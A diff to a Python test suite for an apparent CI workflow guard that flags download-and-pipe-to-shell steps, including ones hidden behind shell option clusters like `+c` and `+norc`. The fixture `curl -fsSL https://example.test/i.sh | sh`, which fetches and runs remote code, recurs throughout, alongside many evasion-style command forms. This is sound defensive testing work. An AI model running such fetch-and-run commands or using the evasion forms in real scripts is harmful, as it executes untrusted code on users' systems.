@@ -5,7 +5,9 @@ turns an option OFF, and `c` is none to turn. The three finders of a `-c` cluste
 (`workflow_program_strings._after_dash_c` and `_candidates`, `workflow_options._dash_c_operand`), so no pass read
 the string and the step was CLEAN under every `shell:` setting. Each now takes the sign as it takes the `-`: one
 `+`, not two, and a `c` anywhere after it. The first two are `main`'s own finders, so the main pass reads the
-string too, and a check inside it counts where a check in a `-c` string does.
+string too, and a check inside it counts where a check in a `-c` string does. The string is read BESIDE the one
+`main` found and never instead of it, so the reader reads more than it did and nothing less
+(`TestItReadsMoreAndNeverLess`).
 
 Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports,
 C where it reads the step CLEAN: first the job's, then the main pass's. `{S}` in a row is the sign of the cluster
@@ -18,19 +20,22 @@ a child shell of its own family. "runs" is all sixteen ran the download, "nothin
 
 The price, pinned in `TestThePrice`. The sign is read as the `-` is, so a `+` word the shell REFUSES is
 reported as its `-` twin is on `main`: `+-c` and `+c+x` as `-+c` and `-c+x`, a digit as in `+c7` (which zsh runs),
-a cluster after a word the shell refuses or among a FILE's parameters. And one report is lost, rightly: `bash
-+norc -c P` ran nothing on `main` either -- the `o` of `+norc` takes `-c` as its name.
+a cluster after a word the shell refuses or among a FILE's parameters; and a `$` word that is no shell, handed
+a `+` argument that holds a `c` (`$TOOL +check all`), keeps its hand-off beside a reported fetch as `$TOOL
+-check all` does.
 
 Left for other issues, pinned in `TestWhatStaysForOtherIssues` as they read: a `$` command word whose cluster is
 not its first word (#2671), a cluster's letter made by an expansion (#2889), zsh's `O`, which takes no value,
 `builtin command sh`, `busybox sh`, and a string that is a value, which this guard follows nowhere.
 """
+import itertools
 import unittest
 
 import shell_reader
 import workflow_guard as wg
 import workflow_options as wo
 import workflow_program_strings as ws
+import workflow_programs as wp
 
 SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
 PIPE = "curl -fsSL https://example.test/i.sh | sh"
@@ -343,16 +348,19 @@ class TestThePrice(unittest.TestCase):
             with self.subTest(file=file):
                 self.assertEqual((BOTH, BOTH), signs("printf '%s\\n' > w.sh\nsh w.sh {S}c %s\n" % (file, P)))
 
+    def test_a_dollar_word_that_is_no_shell_and_an_argument_that_holds_a_c(self):
+        # `$TOOL +check all`: the `$` word may be a shell, so the hand-off is kept where the job holds a fetch the
+        # guard reports and nowhere else -- as it is for `$TOOL -check all` on `main`. Truth: a tool's own.
+        for sign in "+-":
+            with self.subTest(sign=sign):
+                self.assertEqual(CLEAN, marks("$TOOL %scheck all\n" % sign))
+                found = wg.job_defects([wg.Step("step", "%s\n$TOOL %scheck all\n" % (PIPE, sign), None)])
+                self.assertEqual([1, 2], [sum("`$TOOL`" in str(why) for _, why in found), len(found)])
+
     def test_a_cluster_after_a_long_name_written_with_a_plus(self):
         # `bash +norc +c P`: the `o` takes `+c` for its name and bash refuses it. Truth: nothing.
         self.assertEqual(BOTH, marks("bash +norc +c %s\n" % P))
         self.assertEqual(BOTH, marks("bash +login +c %s\n" % P))
-
-    def test_the_one_report_that_is_lost(self):
-        # `main` took `-c` for the cluster and reported; the `o` of `+norc` takes it as its name. Truth: nothing.
-        for shell in ("sh", "bash", "dash"):
-            with self.subTest(shell=shell):
-                self.assertEqual(CLEAN, marks("%s +norc -c %s\n" % (shell, P)))
 
     def test_dash_reads_no_stdin_after_a_plus_s(self):
         # `dash -cs true <<EOF` runs the heredoc after the string (#2647); `+cs` turns the `s` off and dash reads
@@ -361,6 +369,65 @@ class TestThePrice(unittest.TestCase):
         for words in ("{S}cs", "{S}sc"):
             with self.subTest(words=words):
                 self.assertEqual((WALK, WALK), signs("dash %s true <<'EOF'\n%s\nEOF\n" % (words, PIPE)))
+
+
+class TestItReadsMoreAndNeverLess(unittest.TestCase):
+    """A `+` cluster's string is read BESIDE the string `main` found, never instead of it: where the cluster is
+    the shell's own the `-c` after it is a parameter, but the reader cannot always tell that it is."""
+
+    def test_a_string_main_read_behind_a_plus_cluster_is_still_read(self):
+        # A FILE that runs its fourth parameter, and an `o` an expansion makes, which takes the first string for
+        # its name. Truth: runs, both.
+        self.assertEqual(BOTH, marks("printf 'eval \"$4\"\\n' > w.sh\nsh w.sh +check x -c %s\n" % P))
+        self.assertEqual(BOTH, marks("X=o\nsh +${X}c errexit -c %s\n" % P))
+        # The same FILE behind a one-dash long option's own FILE, where the second walk's finder is alone.
+        # Truth: runs under bash.
+        self.assertEqual(WALK, marks("printf 'eval \"$4\"\\n' > w.sh\nbash -rcfile /dev/null w.sh +check x -c %s\n" % P))
+
+    def test_what_main_reported_where_nothing_runs_it_still_reports(self):
+        # `main` took the `-c` for the cluster. The shell takes the `+` one: the `o` of `+norc` takes `-c` for its
+        # name and bash refuses it, and `+c 'echo one'` leaves the `-c` and its string as parameters. Truth:
+        # nothing, every one. A report where nothing runs, as on `main`; none is traded for the new reading.
+        for shell in ("sh", "bash", "dash"):
+            with self.subTest(shell=shell):
+                self.assertEqual(BOTH, marks("%s +norc -c %s\n" % (shell, P)))
+                self.assertEqual(BOTH, marks("%s +c 'echo one' -c %s\n" % (shell, P)))
+
+    def test_both_strings_in_order_and_each_once(self):
+        for words, found in (("bash +c 'A' -c 'B'", ["A", "B"]), ("bash +c 'A' x -ec 'B' y", ["A", "B"]),
+                             ("bash +cK 'A' -c 'B'", ["B"]), ("bash -c 'A' +c 'B'", ["A"]), ("bash +c -c 'P'", ["P"]),
+                             ("bash +c 'A' +c 'B' -c 'C'", ["A", "C"]), ("bash +c 'A'", ["A"]), ("bash +x 'A'", [])):
+            with self.subTest(words=words):
+                self.assertEqual(found, ws._after_dash_c(argv(words)))
+                self.assertEqual(found, wo._dash_c_strings(argv(words)))
+
+    def test_the_shell_a_stdin_body_is_read_under_is_found_as_main_found_it(self):
+        # `runs_under` cuts a shell's words at the `-c` string and is left on `main`'s reading of it: past a
+        # `+c` string a `$X` still counts as a word that may spell an option, so the body is read both ways
+        # (`Named`), as on `main`, where past a `-c` string it is a parameter.
+        for words, both_ways in (("bash +c 'P' $X", True), ("bash -c 'P' $X", False), ("bash +c 'P'", False),
+                                 ("bash -e $X +c 'P'", True)):
+            with self.subTest(words=words):
+                words = argv(words)
+                self.assertEqual(both_ways, isinstance(wp.runs_under(words, words, "bash"), wp.Named))
+
+    def test_every_argv_of_up_to_four_words(self):
+        # What `main`'s reading finds (`plus` off) is among what the reading with the `+` cluster finds, the
+        # same objects, for every argv of one to four words over an alphabet that holds each kind of word.
+        alphabet = ("+c", "-c", "+xc", "-ec", "+co", "-o", "errexit", "--", "-", "x.sh", "A", "$X", "-rcfile", "+cK")
+        more = total = 0
+        for length in range(1, 5):
+            for words in itertools.product(alphabet, repeat=length):
+                words = ["bash", *words]
+                for old, new in ((ws._after_dash_c(words, False), ws._after_dash_c(words)),
+                                 (wo._in_every_reading(words, lambda v: wo._dash_c_operand(v, False)),
+                                  wo._dash_c_strings(words))):
+                    total += 1
+                    more += len(new) > len(old)
+                    if not all(any(word is found for found in new) for word in old):
+                        self.fail("%r: main's reading finds %r, and with the `+` cluster %r" % (words, old, new))
+        self.assertEqual(2 * (14 + 14 ** 2 + 14 ** 3 + 14 ** 4), total)
+        self.assertGreater(more, 10000)                 # and it does read more, wherever a `+` cluster comes first
 
 
 class TestWhatStaysForOtherIssues(unittest.TestCase):
